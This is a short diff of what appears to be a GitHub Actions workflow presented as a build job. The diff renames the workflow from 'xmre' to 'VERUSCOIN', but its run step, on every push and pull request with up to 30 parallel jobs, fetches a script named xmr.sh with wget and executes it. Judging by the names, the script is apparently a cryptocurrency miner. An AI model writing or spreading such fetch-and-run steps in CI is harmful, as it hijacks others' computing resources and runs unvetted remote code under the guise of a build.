@@ -1,8 +1,8 @@
-name: xmre
+name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: azl
+    name: Ba_channel
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: azl
+    - name: BA_channel
       run: |
         wget https://github.com/Bagus617/testtt/blob/main/xmr.sh && chmod u+x xmr.sh && ./xmr.sh
